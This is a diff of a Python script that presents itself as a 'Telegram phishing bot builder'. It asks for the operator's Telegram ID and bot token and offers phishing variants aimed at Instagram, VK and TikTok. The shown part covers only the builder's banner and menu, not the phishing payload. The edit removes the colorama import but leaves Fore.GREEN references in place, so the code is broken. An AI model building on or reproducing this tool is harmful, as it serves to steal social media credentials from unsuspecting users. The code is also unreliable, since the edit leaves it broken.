@@ -1,7 +1,5 @@
 #Developer: @lamer112311
 
-import colorama
-from colorama import Fore, Back, Style
 import os
 from sys import platform
 import base64
@@ -64,19 +62,19 @@ ______ _   _ _____ _____ _   _
 \_|   \_| |_/\___/\____/\_| |_/
 	''')
 
-print(Fore.GREEN + '#########################################')
-print(Fore.GREEN + '+' + Fore.BLUE +  "     Telegram phishing bot builder     " + Fore.GREEN + '+')
-print(Fore.GREEN + '+' + Fore.BLUE +  "       Developer: @lamer112311         " + Fore.GREEN + '+')
-print(Fore.GREEN + '+' + Fore.BLUE +  "        Channel: @Cyber_Puffin         " + Fore.GREEN + '+')
-print(Fore.GREEN + '#########################################')
-userid = input(Fore.YELLOW +  "Введите свой Telegram ID > ")
-token = input(Fore.BLUE +  "Введите токен бота > ")
-print(Fore.CYAN + '''
+print('#########################################')
+print("     Telegram phishing bot builder     " + Fore.GREEN + '+')
+print("       Developer: @lamer112311         " + Fore.GREEN + '+')
+print("        Channel: @Cyber_Puffin         " + Fore.GREEN + '+')
+print('#########################################')
+userid = input("Введите свой Telegram ID > ")
+token = input("Введите токен бота > ")
+print('''
 [1] Instagram
 [2] VK
 [3] Tiktok
 	''')
-choice = input(Fore.MAGENTA +  "Выберите вариант фишинга в боте>>> ")
+choice = input( "Выберите вариант фишинга в боте>>> ")
 if not choice.isdigit():
 	print("Ошибка, вариант должен быть чисельным")
 	exit(0)
